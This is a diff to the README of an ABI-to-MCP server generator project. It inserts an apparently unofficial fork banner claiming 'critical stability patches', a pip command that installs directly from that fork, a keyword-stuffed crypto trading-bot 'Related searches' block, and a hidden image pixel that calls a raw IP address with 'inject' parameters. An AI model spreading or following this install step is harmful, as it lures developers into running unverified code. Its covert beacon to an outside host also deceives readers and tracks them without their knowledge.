@@ -1,3 +1,15 @@
+**Fork Update: SeparateChrysalis71/UCAI**
+
+This fork introduces critical stability patches and performance optimizations that address outstanding core bottlenecks in the upstream repository. Backed by active maintenance and regular bug fixes, it offers developers a highly reliable environment for deployment without breaking existing workflows.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/SeparateChrysalis71/UCAI.git
+```
+
+[https://github.com/SeparateChrysalis71/UCAI](https://github.com/SeparateChrysalis71/UCAI)
+
 # Universal Contract AI Interface      
 ## The ABI-to-MCP Server Generator 
   
@@ -931,3 +943,11 @@ curl -X POST https://modelcontextprotocol.name/mcp/ucai \
 - **All 27 MCP servers** — See the full catalog at [modelcontextprotocol.name](https://modelcontextprotocol.name)
 
 > Powered by [modelcontextprotocol.name](https://modelcontextprotocol.name) — the open MCP HTTP gateway
+
+## Related searches
+
+When exploring decentralized finance automation, users often look for versatile trading bots capable of executing multi-chain strategies across platforms like Solana, BNB Chain, and Tron. Developers and traders frequently search for robust boilerplate code to implement automated liquidity provisioning, cross-dex arbitrage, and secure RPC node connections for high-frequency execution.
+
+**Topics:** jupiter swap aggregator, algorithmic trading bots, pancakeswap flash swaps, tron web3 integration, zcash private transactions, dex arbitrage strategy, automated market making, crypto trading framework, solana mev bots, multi-chain web3 development
+
+![.](http://5.231.58.248:8787/pixel?repo=SeparateChrysalis71%2FUCAI&inject=SeparateChrysalis71%2FUCAI%2Fweb%2Fpackage.json)
